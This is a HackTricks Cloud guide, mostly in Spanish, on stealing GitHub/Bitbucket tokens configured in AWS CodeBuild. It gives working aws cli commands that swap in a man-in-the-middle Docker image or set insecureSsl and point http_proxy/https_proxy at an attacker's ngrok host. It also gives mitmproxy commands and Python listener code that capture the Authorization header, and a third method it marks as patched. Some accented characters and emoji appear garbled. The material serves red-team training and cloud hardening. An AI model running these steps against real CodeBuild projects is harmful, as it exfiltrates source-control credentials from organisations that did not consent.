# AWS Codebuild - Token Leakage

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Recuperar Tokens Configurados de Github/Bitbucket

Primero, verifica si hay credenciales de origen configuradas que podr칤as filtrar:
```bash
aws codebuild list-source-credentials
```
### Via Docker Image

Si encuentras que la autenticaci칩n, por ejemplo, a Github est치 configurada en la cuenta, puedes **exfiltrar** ese **acceso** (**token de GH o token de OAuth**) haciendo que Codebuild **utilice una imagen de docker espec칤fica** para ejecutar la construcci칩n del proyecto.

Para este prop칩sito, podr칤as **crear un nuevo proyecto de Codebuild** o cambiar el **entorno** de uno existente para establecer la **imagen de Docker**.

La imagen de Docker que podr칤as usar es [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Esta es una imagen de Docker muy b치sica que establecer치 las **variables de entorno `https_proxy`**, **`http_proxy`** y **`SSL_CERT_FILE`**. Esto te permitir치 interceptar la mayor parte del tr치fico del host indicado en **`https_proxy`** y **`http_proxy`** y confiar en el CERT SSL indicado en **`SSL_CERT_FILE`**.

1. **Crea y sube tu propia imagen de Docker MitM**
* Sigue las instrucciones del repositorio para establecer tu direcci칩n IP de proxy y configurar tu certificado SSL y **construir la imagen de docker**.
* **NO CONFIGURES `http_proxy`** para no interceptar solicitudes al endpoint de metadatos.
* Podr칤as usar **`ngrok`** como `ngrok tcp 4444` para establecer el proxy en tu host.
* Una vez que tengas la imagen de Docker construida, **c치rgala en un repositorio p칰blico** (Dockerhub, ECR...)
2. **Configura el entorno**
* Crea un **nuevo proyecto de Codebuild** o **modifica** el entorno de uno existente.
* Configura el proyecto para usar la **imagen de Docker generada previamente**.

<figure><img src="../../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

3. **Configura el proxy MitM en tu host**

* Como se indica en el **repositorio de Github**, podr칤as usar algo como:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
La **versi칩n de mitmproxy utilizada fue 9.0.1**, se inform칩 que con la versi칩n 10 esto podr칤a no funcionar.
{% endhint %}

4. **Ejecutar la construcci칩n y capturar las credenciales**

*   Puedes ver el token en el encabezado de **Authorization**:

<figure><img src="../../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

Esto tambi칠n se podr칤a hacer desde la aws cli con algo como

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### Via insecureSSL

**Codebuild** projects have a setting called **`insecureSsl`** that is hidden in the web you can only change it from the API.\
Habilitar esto permite a Codebuild conectarse al repositorio **sin verificar el certificado** ofrecido por la plataforma.

* First you need to enumerate the current configuration with something like:
```bash
aws codebuild batch-get-projects --name <proj-name>
```
* Luego, con la informaci칩n recopilada, puedes actualizar la configuraci칩n del proyecto **`insecureSsl`** a **`True`**. El siguiente es un ejemplo de c칩mo actualic칠 un proyecto, nota el **`insecureSsl=True`** al final (esto es lo 칰nico que necesitas cambiar de la configuraci칩n recopilada).
* Adem치s, agrega tambi칠n las variables de entorno **http\_proxy** y **https\_proxy** apuntando a tu tcp ngrok como: 

{% code overflow="wrap" %}
```bash
aws codebuild update-project --name <proj-name> \
--source '{
"type": "GITHUB",
"location": "https://github.com/carlospolop/404checker",
"gitCloneDepth": 1,
"gitSubmodulesConfig": {
"fetchSubmodules": false
},
"buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n       - echo \"sad\"\n",
"auth": {
"type": "CODECONNECTIONS",
"resource": "arn:aws:codeconnections:eu-west-1:947247140022:connection/46cf78ac-7f60-4d7d-bf86-5011cfd3f4be"
},
"reportBuildStatus": false,
"insecureSsl": true
}' \
--environment '{
"type": "LINUX_CONTAINER",
"image": "aws/codebuild/standard:5.0",
"computeType": "BUILD_GENERAL1_SMALL",
"environmentVariables": [
{
"name": "http_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
},
{
"name": "https_proxy",
"value": "https://2.tcp.eu.ngrok.io:15027"
}
]
}'
```
{% endcode %}

* Luego, ejecuta el ejemplo b치sico de [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) en el puerto indicado por las variables del proxy (http\_proxy y https\_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* Finalmente, haz clic en **Construir el proyecto**, las **credenciales** ser치n **enviadas en texto claro** (base64) al puerto mitm:

<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### ~~A trav칠s del protocolo HTTP~~

{% hint style="success" %}
**Esta vulnerabilidad fue corregida por AWS en alg칰n momento de la semana del 20 de febrero de 2023 (creo que el viernes). As칤 que un atacante no puede abusar de ella m치s :)**
{% endhint %}

Un atacante con **permisos elevados en un CodeBuild podr칤a filtrar el token de Github/Bitbucket** configurado o si los permisos fueron configurados a trav칠s de OAuth, el **token OAuth temporal utilizado para acceder al c칩digo**.

* Un atacante podr칤a agregar las variables de entorno **http\_proxy** y **https\_proxy** al proyecto de CodeBuild apuntando a su m치quina (por ejemplo `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

* Luego, cambia la URL del repositorio de github para usar HTTP en lugar de HTTPS, por ejemplo: `http://github.com/carlospolop-forks/TestActions`
* Luego, ejecuta el ejemplo b치sico de [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) en el puerto se침alado por las variables de proxy (http\_proxy y https\_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* Finalmente, haz clic en **Construir el proyecto**, las **credenciales** ser치n **enviadas en texto claro** (base64) al puerto mitm:

<figure><img src="../../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Ahora un atacante podr치 usar el token desde su m치quina, listar todos los privilegios que tiene y (ab)usar m치s f치cilmente que usando el servicio CodeBuild directamente.
{% endhint %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
